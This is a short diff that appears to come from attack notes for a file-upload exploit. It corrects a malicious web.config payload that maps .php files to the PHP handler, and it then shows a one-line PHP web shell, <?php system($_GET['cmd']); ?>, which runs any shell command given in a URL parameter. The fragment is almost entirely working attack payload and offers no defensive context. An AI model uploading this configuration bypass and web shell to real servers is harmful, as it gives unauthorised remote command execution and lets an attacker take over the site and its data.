@@ -24,11 +24,13 @@ Content-Type: application/x-httpd-php
 Step 1 >>
 filename="web.config"
 Content-Type: text/plain
-<system.webServer>
-    <staticContent>
-        <mimeMap fileExtension=".php" mimeType="application/x-httpd-php" />
-    </staticContent>
-</system.webServer>
+<configuration>
+    <system.webServer>
+        <staticContent>
+            <mimeMap fileExtension=".php" mimeType="application/x-httpd-php" />
+        </staticContent>
+    </system.webServer>
+</configuration>
 Step 2 >>
 Content-Type: application/x-httpd-php
 <?php system($_GET['cmd']); ?>
